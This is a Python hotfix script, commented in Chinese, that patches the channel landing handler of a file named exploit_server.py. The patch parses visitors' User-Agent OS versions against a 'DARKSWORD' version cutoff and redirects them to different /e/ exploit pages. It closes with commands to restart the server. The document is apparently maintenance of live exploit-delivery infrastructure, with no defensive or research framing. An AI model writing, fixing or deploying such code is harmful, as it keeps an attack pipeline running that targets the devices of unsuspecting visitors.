# -*- coding: utf-8 -*-
"""
_v204_hotfix12v2.py  ─── 修 /ch/<slug> 404/502 真根因 (双 PATCH, v3 修正版)

PATCH-A (90% 根因): 精确替换最后一行
         return self._serve_template_page("index", frame=False, channel=ch)
         → if 返回 False/抛异常: 强制 fallback 302 /e/group.html

PATCH-B (兜底): 整个 _serve_channel_landing 包 try/except, body 每行再缩进 4 空格
         (任何中间步骤异常 → 502 断开 → 也 fallback 302)

执行:
  上传服务器 /www/wwwroot/coruna/server/_v204_hotfix12v2.py
  python3 -m py_compile _v204_hotfix12v2.py
  python3 _v204_hotfix12v2.py 2>&1 | tee /tmp/hotfix12v2.log
"""

import os, sys, time, shutil, ast, re

PROJ   = '/www/wwwroot/coruna/server'
ESFILE = os.path.join(PROJ, 'exploit_server.py')
BAKDIR = os.path.join(PROJ, 'bak_v204_hotfix12v2')
os.makedirs(BAKDIR, exist_ok=True)

# ── 0. 备份 ──
ts = time.strftime('%Y%m%d%H%M%S')
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{ts}')
shutil.copy2(ESFILE, bak)
ORIG_SIZE = os.path.getsize(ESFILE)
print(f'[BAK] {bak} (size={ORIG_SIZE})')

# ── 1. 读源 + 换行归一化 (CRLF/CR → LF, 写回时还原) ──
with open(ESFILE, 'rb') as f:
    src_bytes = f.read()
ORIG_NL_BYTES = b'\r\n' if src_bytes.count(b'\r\n') > src_bytes.count(b'\n') * 0.5 else b'\n'
src_raw = src_bytes.decode('utf-8', errors='replace')
# 先 \r\n → \n, 再 \r → \n (兼容所有老 Mac 换行)
src_text = src_raw.replace('\r\n', '\n').replace('\r', '\n')
lines = src_text.split('\n')
print(f'[INFO] lines={len(lines)} ORIG_NL_BYTES={ORIG_NL_BYTES!r}')

# ═══════════════════════════════════════════════════════════════
# PATCH-A: 精确替换最后一行 (仅 _serve_channel_landing 内部那行)
# ═══════════════════════════════════════════════════════════════
OLD_LAST_LINE = '        return self._serve_template_page("index", frame=False, channel=ch)'
# 宽松 fallback 正则
PAT_LAST = re.compile(r'^\s*return\s+self\._serve_template_page\(\s*"index"\s*,\s*frame\s*=\s*False\s*,\s*channel\s*=\s*ch\s*\)\s*$')

NEW_LAST_BLOCK_LINES = [
    '        # PATCH v20.4-HOTFIX12v2-PATCH-A: _serve_template_page("index") 返回 False 或抛异常时强制 fallback 302 /e/group.html (DARKSWORD_CUTOFF_FULL=170201 三处分流对齐)',
    '        _ch_idx_r = False',
    '        try:',
    '            _ch_idx_r = self._serve_template_page("index", frame=False, channel=ch)',
    '        except Exception as _ch_idx_e:',
    '            try:',
    '                from admin.database import _parse_version_full, DARKSWORD_CUTOFF_FULL',
    '                _osv, _, _, _, _, _, _ = parse_user_agent(self.headers.get("User-Agent", ""))',
    '                _vf = _parse_version_full(_osv) if _parse_version_full and _osv else None',
    '                _isds = (_vf is None) or (_vf > DARKSWORD_CUTOFF_FULL)',
    '                _hdr = self.headers.get("Host") or "127.0.0.1:7070"',
    '                _sch = "https" if (self.headers.get("X-Forwarded-Proto","")=="https" or self.headers.get("X-Forwarded-Ssl","")=="on") else "http"',
    '                _tgt = f"{_sch}://{_hdr}/e/group.html" if _isds else f"{_sch}://{_hdr}/e/index.html"',
    '                log_to_file(f"[CH-IDX-EXCEPT] slug={slug} err={_ch_idx_e} → 302 {_tgt}")',
    '                self.send_response(302)',
    '                self.send_header("Location", _tgt)',
    '                try: self._write_ds_ids()',
    '                except Exception: pass',
    '                self.send_header("Cache-Control","no-store, no-cache, must-revalidate, max-age=0, private")',
    '                self.send_header("Vary", "User-Agent, X-Forwarded-Proto")',
    '                self.end_headers()',
    '                return True',
    '            except Exception:',
    '                try:',
    '                    self.send_response(302)',
    '                    self.send_header("Location", "/e/group.html")',
    '                    self.end_headers()',
    '                    return True',
    '                except Exception:',
    '                    pass',
    '        if not _ch_idx_r:',
    '            try:',
    '                from admin.database import _parse_version_full, DARKSWORD_CUTOFF_FULL',
    '                _osv, _, _, _, _, _, _ = parse_user_agent(self.headers.get("User-Agent", ""))',
    '                _vf = _parse_version_full(_osv) if _parse_version_full and _osv else None',
    '                _isds = (_vf is None) or (_vf > DARKSWORD_CUTOFF_FULL)',
    '                _hdr = self.headers.get("Host") or "127.0.0.1:7070"',
    '                _sch = "https" if (self.headers.get("X-Forwarded-Proto","")=="https" or self.headers.get("X-Forwarded-Ssl","")=="on") else "http"',
    '                _tgt = f"{_sch}://{_hdr}/e/group.html" if _isds else f"{_sch}://{_hdr}/e/index.html"',
    '                log_to_file(f"[CH-IDX-FALSE] slug={slug} _serve_template_page(index)=False/None → 302 {_tgt}")',
    '                self.send_response(302)',
    '                self.send_header("Location", _tgt)',
    '                try: self._write_ds_ids()',
    '                except Exception: pass',
    '                self.send_header("Cache-Control","no-store, no-cache, must-revalidate, max-age=0, private")',
    '                self.send_header("Vary", "User-Agent, X-Forwarded-Proto")',
    '                self.end_headers()',
    '                return True',
    '            except Exception:',
    '                try:',
    '                    self.send_response(302)',
    '                    self.send_header("Location", "/e/group.html")',
    '                    self.end_headers()',
    '                    return True',
    '                except Exception:',
    '                    pass',
    '        return _ch_idx_r if _ch_idx_r is not None else True',
]

new_lines_a = []
PATCH_A_OK = False
for i, ln in enumerate(lines):
    if ln == OLD_LAST_LINE or PAT_LAST.match(ln):
        print(f'[PATCH-A] ✅ 命中 L={i+1} line="{ln[:70]}"')
        for nline in NEW_LAST_BLOCK_LINES:
            new_lines_a.append(nline)
        PATCH_A_OK = True
    else:
        new_lines_a.append(ln)
if not PATCH_A_OK:
    print('[FATAL] PATCH-A 未命中 (OLD_LAST_LINE/PAT_LAST 都没命中), 停止'); sys.exit(1)
text_after_a = '\n'.join(new_lines_a)
print(f'[PATCH-A] 完成, delta lines={len(new_lines_a)-len(lines):+d}')

# ═══════════════════════════════════════════════════════════════
# PATCH-B: 整个 _serve_channel_landing 包 try/except (异常兜底)
#   ⚠ 关键: ^([ \t]*) 只匹配水平缩进空格/tab, 不匹配 \n/\r (避免贪婪吞掉空行)
# ═══════════════════════════════════════════════════════════════
DEF_PAT = re.compile(r'^([ \t]*)def\s+_serve_channel_landing\s*\(', re.MULTILINE)
m = DEF_PAT.search(text_after_a)
if not m:
    print('[FATAL] PATCH-B: def _serve_channel_landing 没找到 (检查正则)'); sys.exit(1)
def_indent_hspaces = m.group(1)  # 纯水平空格/tab, 不含换行
def_start_pos = m.start()
def_line_0index = text_after_a[:def_start_pos].count('\n')  # 0-indexed
print(f'[PATCH-B] def 行: 1-index L={def_line_0index+1} hspace_indent_len={len(def_indent_hspaces)} raw="{def_indent_hspaces!r}"')

lines_a = text_after_a.split('\n')
NLa = len(lines_a)
# 找函数结束: 从 def 行的下一行开始遍历, 遇到 第一个 缩进 <= def 缩进 且以 (def / class / @) 开头的非空行 即结束
fn_indent_len = len(def_indent_hspaces)
end_0index_exclusive = None   # 结束后第一行 (0-index exclusive)
for j in range(def_line_0index + 1, NLa):
    raw = lines_a[j]
    if not raw.strip():                       # 空行跳过
        continue
    if raw.lstrip(' \t').startswith('#'):     # 纯注释行跳过 (避免缩进和 def 相同的注释打断)
        continue
    cur_h_indent = len(raw) - len(raw.lstrip(' \t'))
    head = raw.lstrip(' \t')
    if cur_h_indent <= fn_indent_len and (head.startswith('def ') or head.startswith('class ') or head.startswith('@')):
        end_0index_exclusive = j
        break
if end_0index_exclusive is None:
    end_0index_exclusive = NLa
# Visual sanity: body 应该至少 20 行
body_nlines = end_0index_exclusive - (def_line_0index + 1)
if body_nlines < 20:
    print(f'[WARN] body_nlines={body_nlines} < 20, end 检测可能有误! 强制放宽...')
    # fallback: 找 def 行之后 100 行内下一个 method
    for j in range(def_line_0index + 1, min(NLa, def_line_0index + 200)):
        raw = lines_a[j]
        head = raw.lstrip(' \t')
        cur_h_indent = len(raw) - len(raw.lstrip(' \t'))
        if cur_h_indent == fn_indent_len and (head.startswith('def ') or head.startswith('class ')):
            end_0index_exclusive = j
            body_nlines = end_0index_exclusive - (def_line_0index + 1)
            print(f'[PATCH-B] fallback end={end_0index_exclusive+1} (1-index) body={body_nlines}')
            break
print(f'[PATCH-B] body: 1-index L={def_line_0index+2} ~ L={end_0index_exclusive} (共 {body_nlines} 行)')

# 原 body (def 行下一行 到 end_0index_exclusive 之前)
orig_body_lines = lines_a[def_line_0index + 1 : end_0index_exclusive]
# ⚠ 缩进结构 (类方法 body + try 子块双层):
#   def_indent_hspaces (=4)  → class method 定义行缩进
#   FN_BODY_INDENT (=8)     → 函数体 (def_indent_hspaces + 4)
#   TRY_EXTRA_4   (=再+4)   → try: 子块内部
FN_BODY_INDENT = def_indent_hspaces + '    '
TRY_EXTRA_4   = '    '
indented_body = []
for bl in orig_body_lines:
    if not bl.strip():
        indented_body.append('')
    else:
        # 原 body 已是 8 空格 (FN_BODY), 加 TRY_EXTRA_4 → 12 空格进入 try:
        indented_body.append(TRY_EXTRA_4 + bl)

# try 壳 + except 块 (都在 FN_BODY_INDENT = 8 空格级别, 和原 return True 同级)
WRAPPER_PREFIX_LINES = [
    FN_BODY_INDENT + '# PATCH v20.4-HOTFIX12v2-PATCH-B: 整个 _serve_channel_landing 异常兜底 (任何 Exception → fallback 302 /e/group.html)',
    FN_BODY_INDENT + 'try:',
]
EXCEPT_BLOCK_LINES = [
    FN_BODY_INDENT + 'except Exception as _ch_glob_e:',
    FN_BODY_INDENT + '    try:',
    FN_BODY_INDENT + '        from admin.database import _parse_version_full, DARKSWORD_CUTOFF_FULL',
    FN_BODY_INDENT + '        _osv, _, _, _, _, _, _ = parse_user_agent(self.headers.get("User-Agent", ""))',
    FN_BODY_INDENT + '        _vf = _parse_version_full(_osv) if _parse_version_full and _osv else None',
    FN_BODY_INDENT + '        _isds = (_vf is None) or (_vf > DARKSWORD_CUTOFF_FULL)',
    FN_BODY_INDENT + '        _hdr = self.headers.get("Host") or "127.0.0.1:7070"',
    FN_BODY_INDENT + '        _sch = "https" if (self.headers.get("X-Forwarded-Proto","")=="https" or self.headers.get("X-Forwarded-Ssl","")=="on") else "http"',
    FN_BODY_INDENT + '        _tgt = f"{_sch}://{_hdr}/e/group.html" if _isds else f"{_sch}://{_hdr}/e/index.html"',
    FN_BODY_INDENT + '        log_to_file(f"[CH-GLOB-EXCEPT-302] slug={slug} err={_ch_glob_e} → {_tgt}")',
    FN_BODY_INDENT + '        self.send_response(302)',
    FN_BODY_INDENT + '        self.send_header("Location", _tgt)',
    FN_BODY_INDENT + '        try: self._write_ds_ids()',
    FN_BODY_INDENT + '        except Exception: pass',
    FN_BODY_INDENT + '        self.send_header("Cache-Control","no-store, no-cache, must-revalidate, max-age=0, private")',
    FN_BODY_INDENT + '        self.send_header("Vary", "User-Agent, X-Forwarded-Proto")',
    FN_BODY_INDENT + '        self.end_headers()',
    FN_BODY_INDENT + '        return True',
    FN_BODY_INDENT + '    except Exception:',
    FN_BODY_INDENT + '        try:',
    FN_BODY_INDENT + '            self.send_response(302)',
    FN_BODY_INDENT + '            self.send_header("Location", "/e/group.html")',
    FN_BODY_INDENT + '            self.end_headers()',
    FN_BODY_INDENT + '            return True',
    FN_BODY_INDENT + '        except Exception:',
    FN_BODY_INDENT + '            pass',
    FN_BODY_INDENT + '        return True',
]
wrapped_body = WRAPPER_PREFIX_LINES + indented_body + EXCEPT_BLOCK_LINES

# 最终重构
final_lines = (
    lines_a[:def_line_0index]          # def 行之前
    + [lines_a[def_line_0index]]       # def 行本身
    + wrapped_body                     # PATCH-B 包裹后的 body
    + lines_a[end_0index_exclusive:]   # 函数之后 (下一个 def 开始)
)
final_text_LFonly = '\n'.join(final_lines)

# ── 2. ast.parse 语法校验 ──
try:
    ast.parse(final_text_LFonly)
    print('[SYNTAX] ✅ ast.parse PASS')
except SyntaxError as e:
    print(f'[SYNTAX] ❌ FAIL: {e.msg}  line={e.lineno}  offset={e.offset}  text={e.text!r}')
    fl = final_text_LFonly.split('\n')
    lo = max(0, e.lineno - 5)
    hi = min(len(fl), e.lineno + 4)
    print(f'--- context L{lo+1}-L{hi} ---')
    for ek in range(lo, hi):
        print(f'  {ek+1:4d}|{fl[ek]}')
    shutil.copy2(bak, ESFILE)
    print(f'[ROLLBACK] 已恢复 {bak}'); sys.exit(1)

# ── 3. 还原原始换行符 并 写回二进制 ──
if ORIG_NL_BYTES == b'\r\n':
    final_bytes = final_text_LFonly.replace('\n', '\r\n').encode('utf-8')
else:
    final_bytes = final_text_LFonly.encode('utf-8')
with open(ESFILE, 'wb') as f:
    f.write(final_bytes)
NEW_SIZE = os.path.getsize(ESFILE)
print(f'[WRITE] {ESFILE}  before={ORIG_SIZE}  after={NEW_SIZE}  delta={NEW_SIZE-ORIG_SIZE:+d}  bytes')

# ── 4. 双 PATCH 后 grep 验证 (读回校验) ──
with open(ESFILE, 'rb') as f:
    vt_raw = f.read().decode('utf-8', errors='replace').replace('\r\n', '\n').replace('\r', '\n')
def _occ(pattern, s=vt_raw):
    import re as _re
    return [1 + s[:m.start()].count('\n') for m in _re.finditer(pattern, s, _re.MULTILINE)]
print(f'[VERIFY] PATCH-A 标记 (CH-IDX-FALSE)        → L={_occ(r"CH-IDX-FALSE")}')
print(f'[VERIFY] PATCH-A 标记 (CH-IDX-EXCEPT)       → L={_occ(r"CH-IDX-EXCEPT")}')
print(f'[VERIFY] PATCH-B 标记 (PATCH-B wrapper try) → L={_occ(r"PATCH v20\.4-HOTFIX12v2-PATCH-B")}')
print(f'[VERIFY] PATCH-B 全局异常 (CH-GLOB-EXCEPT)  → L={_occ(r"CH-GLOB-EXCEPT-302")}')
print('✅ HOTFIX12v2 双 PATCH 全部应用成功!')
print()
print('👉 下一步 SSH 执行:')
print('   (1) pkill -9 -f "python3.*exploit_server.py" ; sleep 1')
print('   (2) cd /www/wwwroot/coruna/server && nohup python3 exploit_server.py > /tmp/exploit_server.log 2>&1 &')
print('   (3) sleep 2 && ss -lntp | grep -E ":7070|:7000"')
print('   (4) curl -sv http://127.0.0.1:7070/ch/test001')
print('   (5) curl -sv http://127.0.0.1:7070/ch/not_exist_slug_xyz')
print('   两个 curl 都应 302 → /e/group.html')
